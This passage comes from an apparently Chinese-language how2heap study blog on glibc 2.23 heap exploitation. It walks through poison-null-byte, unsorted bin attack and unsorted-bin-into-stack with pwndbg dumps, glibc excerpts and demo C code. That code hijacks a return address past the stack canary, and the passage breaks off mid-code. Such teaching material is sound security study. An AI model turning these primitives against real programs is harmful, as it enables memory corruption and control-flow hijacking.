src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622726951068-d6da0af4-8bd0-4e33-b003-9c078bb71d70.png#clientId=u347f053a-7aac-4&from=paste&height=26&id=u62a4d804&name=image.png&originHeight=51&originWidth=464&originalType=binary%E2%88%B6=1&size=20487&status=done&style=none&taskId=u592a1b66-9865-4f94-aa68-12c1ad333e3&width=232" alt="image.png"><br>可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x200<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517525391-5556d241-f561-4af8-aa49-788ca9c4cf55.png#clientId=u347f053a-7aac-4&from=paste&height=299&id=u041b16b4&name=image.png&originHeight=597&originWidth=1095&originalType=binary%E2%88%B6=1&size=563900&status=done&style=none&taskId=u067af4f7-7887-4809-bbff-9fde5b59098&width=547.5" alt="image.png"><br>此时 c 附近的内存布局为：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622790352514-7925401c-b1a6-486a-bd99-e28a59857e50.png#clientId=u38185df4-f4d6-4&from=paste&height=89&id=ubab11d5a&name=image.png&originHeight=178&originWidth=630&originalType=binary%E2%88%B6=1&size=133263&status=done&style=none&taskId=u00b8c7ae-fce5-42f9-af3e-3ee466a238b&width=315" alt="image.png"><br>然后 malloc 一个大小 0x100 的<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517765087-15d8214d-3ba8-4762-a5f2-c83222035cde.png#clientId=u347f053a-7aac-4&from=paste&height=246&id=u5287ab82&name=image.png&originHeight=492&originWidth=717&originalType=binary%E2%88%B6=1&size=211710&status=done&style=none&taskId=u47f0c58b-bc17-41e6-8618-b79ccd5522f&width=358.5" alt="image.png"><br>返回给 b1 的地址就是前面 free 掉的 b 的地址。<br>这个时候 chunk c 的 prev_size 本应该变为 0xf0（0x200-0x110)。<br>注意分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。现在 C 的 presize 在原来地址的前 0x10 bytes 处（2 个单元）更新。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">10</span>gx c<span class="hljs-number">-0x20</span><br><span class="hljs-number">0x8008310</span>:      <span class="hljs-number">0x00000000000000f0</span>      <span class="hljs-number">0x0000000000000000</span>   &lt;-fake chunk<br><span class="hljs-number">0x8008320</span>:      <span class="hljs-number">0x0000000000000210</span>      <span class="hljs-number">0x0000000000000110</span>   &lt;-chunk c<br><span class="hljs-number">0x8008330</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008340</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8008350</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk。但其实这片内存已经被分配给了 chunk b1。<br>再 b2 = malloc(0x80);<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517901533-57260577-e5af-410e-a8a9-40dedc8c706d.png#clientId=u347f053a-7aac-4&from=paste&height=325&id=u67d2c401&name=image.png&originHeight=649&originWidth=765&originalType=binary%E2%88%B6=1&size=432623&status=done&style=none&taskId=uad2f58c3-1b4a-4bc6-bceb-b69c2430848&width=382.5" alt="image.png"><br>查看 b2 内容<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518111313-7cdbe7b7-24da-4a27-9627-3eeeedbe34c0.png#clientId=u347f053a-7aac-4&from=paste&height=43&id=u9891ba02&name=image.png&originHeight=86&originWidth=1408&originalType=binary%E2%88%B6=1&size=66799&status=done&style=none&taskId=u4abc7e76-7fc1-430b-b003-67a1ca162ab&width=704" alt="image.png"><br>之后我们将 b1 和 c 依次 free。这会导致 b1 开始的位置一直到 c 的末尾中间的内存会合并成一块。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518194077-7a76d8d7-bdb0-4646-9265-9bff36bf6d1a.png#clientId=u347f053a-7aac-4&from=paste&height=245&id=ue1b01bcc&name=image.png&originHeight=489&originWidth=690&originalType=binary%E2%88%B6=1&size=307368&status=done&style=none&taskId=u66134a2a-6185-42df-8286-348ccc688e4&width=345" alt="image.png"><br>为什么会发生合并？<br>在我们第一次 free(b)之前，进行了如下的设置：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br></code></pre></td></tr></table></figure><p>这一步确保了我们之后进行 null byte 溢出后，还能成功 free(b)，逃过** ‘chunksize(P) != prev_size (next_chunk(P))’** 的检查。<br>之后分配 b1 和 b2 的时候，presize 也会一直在(b+0x1f0)处更新。<br>而在最后 free(c)的时候，检查的是 c 的 presize 位，而因为最开始的 null byte 溢出，导致这块区域的值一直没被更新，一直是 b 最开始的大小 0x210 。<br>我们知道，两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释放 chunk c，因为 chunk c 的 prevsize 没有变化，这个时候 chunk c 会认为 chunk b1 就是 chunk b，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。 chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块区域都是未分配的。</p><blockquote><p>补充：</p></blockquote><p>chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-comment">/* consolidate backward */</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>    unlink(av, p, bck, fwd);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">not placed into regular bins until after they have</span><br><span class="hljs-comment">been given one chance to be used in malloc.</span><br><span class="hljs-comment">  */</span><br>    [...]<br>  &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">    consolidate into top</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    check_chunk(av, p);<br>  &#125;<br></code></pre></td></tr></table></figure><p>d = malloc(0x300);之后<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518241999-9ef69691-ef9a-445a-b7af-07e748c8f356.png#clientId=u347f053a-7aac-4&from=paste&height=292&id=u8ac32d1f&name=image.png&originHeight=584&originWidth=856&originalType=binary%E2%88%B6=1&size=322110&status=done&style=none&taskId=u180d0ab4-b269-41a1-82ba-b7916de8294&width=428" alt="image.png"><br>返回的地址还是原来 b 的地址（0x8008120-0x10)，刚才没有 free 的 b2 也被包含在了里面<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518363634-5cd232ab-d33f-4162-a14e-c1880865842b.png#clientId=u347f053a-7aac-4&from=paste&height=221&id=u0df4b579&name=image.png&originHeight=441&originWidth=728&originalType=binary%E2%88%B6=1&size=273747&status=done&style=none&taskId=ue4446f69-2c7e-4ee8-84e6-a39289eafa7&width=364" alt="image.png"><br>查看 b2 内容<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518425460-9b6ca5ed-9ac0-4433-90d3-3e06fb982da4.png#clientId=u347f053a-7aac-4&from=paste&height=402&id=u2001de99&name=image.png&originHeight=803&originWidth=1817&originalType=binary%E2%88%B6=1&size=1146578&status=done&style=none&taskId=u0b17fedc-0d1f-4bbb-84a2-a65830e45a9&width=908.5" alt="image.png"><br>该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。<br>对于单字节溢出的利用有下面几种：</p><ul><li>扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>收缩被释放块(即本题)：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的 poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>     <span class="hljs-number">0x210</span>     <span class="hljs-number">0x80</span><br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   初始状态<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   释放 B<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x200</span><br>|-------|---------------|-------|   之后的 <span class="hljs-built_in">malloc</span> 操作没有更新 C 的 prev_size<br>         <span class="hljs-number">0x100</span>  <span class="hljs-number">0x80</span><br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 B1<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|   B2 将被覆盖<br>        |&lt;实际得到的块&gt;|<br></code></pre></td></tr></table></figure><h1 id="unsorted-bin-attack-2-23"><a href="#unsorted-bin-attack-2-23" class="headerlink" title="unsorted_bin_attack-2.23"></a>unsorted_bin_attack-2.23</h1><p>这个例程通过 unsortedbin 攻击往栈中写入一个 unsigned long 的值。<br>在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。<br>比如，我们在栈上有一个栈单元 stack_var 需要被改写<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535426079-eb2f090c-5d2b-4a52-aa4f-0b1abcf39af1.png#clientId=u347f053a-7aac-4&from=paste&height=363&id=u7d59295c&name=image.png&originHeight=725&originWidth=1261&originalType=binary%E2%88%B6=1&size=1096913&status=done&style=none&taskId=u89bded64-5af6-47f4-924f-79af335cdee&width=630.5" alt="image.png"><br>然后正常地分配一个 chunk。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535573959-bb4390f8-9b70-4c7c-9804-03800b98dbb3.png#clientId=u347f053a-7aac-4&from=paste&height=382&id=u2ffbb479&name=image.png&originHeight=763&originWidth=1317&originalType=binary%E2%88%B6=1&size=1001146&status=done&style=none&taskId=u9f9e017f-e53d-45c3-8392-e81c850ad3d&width=658.5" alt="image.png"><br>再分配一个，防止前一个 chunk 在 free 的时候被合并了。<br>然后 free(p);之后 p 会被插入到 unsortedbin 链表中，它的 fd 和 bk 都指向 unsortedbin 的 head。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535687040-3198879a-5e40-4b27-a9a6-8a1f68a5de01.png#clientId=u347f053a-7aac-4&from=paste&height=411&id=ue0445c3d&name=image.png&originHeight=821&originWidth=1273&originalType=binary%E2%88%B6=1&size=926264&status=done&style=none&taskId=u78523055-0f89-49a0-b52c-064720e5b68&width=636.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535889873-38f443ff-ab50-4387-a502-0505744b5d59.png#clientId=u347f053a-7aac-4&from=paste&height=203&id=u2f7a2bd4&name=image.png&originHeight=405&originWidth=700&originalType=binary%E2%88%B6=1&size=169863&status=done&style=none&taskId=ub7295ae7-dad7-4660-93cc-0a102a030ea&width=350" alt="image.png"><br>接着我们模拟一个漏洞攻击改写 p 的 bk 指针：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622536184807-d0f40425-0e01-42e7-9b63-b891e8b3685a.png#clientId=u347f053a-7aac-4&from=paste&height=311&id=u9296eb09&name=image.png&originHeight=622&originWidth=1428&originalType=binary%E2%88%B6=1&size=739966&status=done&style=none&taskId=udf20161b-ffa2-4891-a78c-e634bd5c40b&width=714" alt="image.png"><br>然后 malloc<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622536423282-8f20b15d-fd6b-48af-a2a2-7c268c64c29e.png#clientId=u347f053a-7aac-4&from=paste&height=424&id=ua20c418c&name=image.png&originHeight=848&originWidth=1326&originalType=binary%E2%88%B6=1&size=997797&status=done&style=none&taskId=u32fd2ae3-917b-48d2-b75f-4af6bd9b269&width=663" alt="image.png"><br>然后<strong>stack_var</strong>的值就被改写成了 unsortedbin 的 head 的地址了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622536471263-ce97256d-2443-4eeb-9cba-c8f16ca820df.png#clientId=u347f053a-7aac-4&from=paste&height=31&id=uf7fabbe9&name=image.png&originHeight=61&originWidth=461&originalType=binary%E2%88%B6=1&size=19308&status=done&style=none&taskId=uff3920b9-bf5d-41e3-acc8-d4bdc28317d&width=230.5" alt="image.png"><br>之前的 unsafe_unlink 是通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。<br>可以参考这一篇：<a href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">Pwn 的挖坑填坑之旅</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622538109096-2e959076-e5a5-4d23-bd96-a531122e0c97.png#clientId=u347f053a-7aac-4&from=paste&height=114&id=ufc44a364&name=image.png&originHeight=227&originWidth=1230&originalType=binary%E2%88%B6=1&size=36359&status=done&style=none&taskId=u3dba95ad-3e7f-4983-9930-9ec41b88f5d&width=615" alt="image.png"></p><h1 id="unsorted-bin-into-stack-2-23"><a href="#unsorted-bin-into-stack-2-23" class="headerlink" title="unsorted_bin_into_stack-2.23"></a>unsorted_bin_into_stack-2.23</h1><p>例子源码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>        <span class="hljs-built_in">free</span>(victim);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br>        stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>        stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br><br>        <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*S</span><br><span class="hljs-string">IZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br>        victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>        victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>        <span class="hljs-comment">//------------------------------------</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><br>        <span class="hljs-keyword">intptr_t</span> sc = (<span class="hljs-keyword">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>        <span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), ≻, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>        assert((<span class="hljs-keyword">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-keyword">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>本题 unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。<br>初始栈<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622792793495-3d896a44-0ef9-41c6-b7f8-1e83072e9644.png#clientId=u38185df4-f4d6-4&from=paste&height=169&id=u10f80e0e&name=image.png&originHeight=244&originWidth=857&originalType=binary%E2%88%B6=1&size=239052&status=done&style=none&taskId=u384c129f-04ad-4a88-b95e-d38c2445330&width=593.5" alt="image.png"><br>先 malloc 一个 victim 块<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622792972430-0a6675ef-e922-4622-bdb2-bd18a5f20d01.png#clientId=u38185df4-f4d6-4&from=paste&height=168&id=u4ef9ac2b&name=image.png&originHeight=336&originWidth=561&originalType=binary%E2%88%B6=1&size=171711&status=done&style=none&taskId=ucc095613-3559-47fc-acbe-4799fd59cbb&width=280.5" alt="image.png"><br>再分配一个防止 free 的时候和 top chunk 合并。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622793050854-4d51a88c-2d4e-4abc-9fad-cfc16462f8cb.png#clientId=u38185df4-f4d6-4&from=paste&height=219&id=u593caa2a&name=image.png&originHeight=437&originWidth=739&originalType=binary%E2%88%B6=1&size=274303&status=done&style=none&taskId=u3d672eb4-d629-46c2-818c-6ed05935421&width=369.5" alt="image.png"><br>接下来释放 p<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622793084517-ac841663-1176-48bc-897a-17b5e6139507.png#clientId=u38185df4-f4d6-4&from=paste&height=246&id=u8713a8b8&name=image.png&originHeight=492&originWidth=630&originalType=binary%E2%88%B6=1&size=283418&status=done&style=none&taskId=ufc8a4875-9011-4a1b-90f7-f38cfbfc398&width=315" alt="image.png"><br>可以看到它插入了 unsorted bin 列表中<br>我们要在栈上构造一个 chunk，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br></code></pre></td></tr></table></figure><p>查看此时内存布局</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000111</span> &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx stack_buffer<br><span class="hljs-number">0x7ffffffed9a0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000110</span>  &lt;-- fake chunk<br><span class="hljs-number">0x7ffffffed9b0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a0</span><br></code></pre></td></tr></table></figure><p>然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br></code></pre></td></tr></table></figure><p>这里的 size = 32，只要是一个合理的范围，比之后要申请的 chunk size 要小就行。然后我们把 victim-&gt;bk 的值赋为 stack_buffer</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span>   &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007ffffffed9a0</span>   &lt;-- bk pointer<br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622793793072-91fb3053-b657-414b-9c63-b6aefa287576.png#clientId=u38185df4-f4d6-4&from=paste&height=321&id=uc4f1b5a0&name=image.png&originHeight=642&originWidth=1051&originalType=binary%E2%88%B6=1&size=657454&status=done&style=none&taskId=u3fca205b-d8a5-417e-96c2-cd41a462aa2&width=525.5" alt="image.png"><br>过程如下：</p><p>首先 victim chunk 被从 unsorted bin 中取出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = victim-&gt;bk;<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>显然这个 chunk 的大小是不够的，所以被放入 small bin 中。<br>现在再从 unsorted bin 拿出一个被构造的 fake chunk ，现在有了一些检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> 